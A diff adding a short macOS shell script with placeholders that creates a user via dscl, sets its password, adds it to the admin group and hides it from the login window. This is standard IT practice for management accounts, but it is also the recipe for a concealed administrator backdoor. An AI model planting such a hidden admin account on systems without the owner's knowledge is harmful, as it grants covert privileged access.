@@ -1,0 +1,12 @@
+#mkdir /<USER_PATH>/<ADMIN_NAME>
+mv /Users/<ADMIN_NAME> /<USER_PATH>/
+#dscl . -create /Users/<ADMIN_NAME>
+dscl . -create /Users/<ADMIN_NAME> RealName "<FULL ADMIN NAME>"
+dscl . -create /Users/<ADMIN_NAME> NFSHomeDirectory /<USER_PATH>/<ADMIN_NAME>
+dscl . -create /Users/<ADMIN_NAME> UserShell /bin/bash
+dscl . -create /Users/<ADMIN_NAME> UniqueID <ID_NUMBER>
+dscl . -create /Users/<ADMIN_NAME> PrimaryGroupID 20
+dscl . -passwd /Users/<ADMIN_NAME> '<PASSWORD>'
+dscl . -append /Groups/admin GroupMembership <ADMIN_NAME>
+chown -R -f <ADMIN_NAME>:staff /var/<ADMIN_NAME>
+defaults write /Library/Preferences/com.apple.loginwindow HiddenUsersList -array-add <ADMIN_NAME>
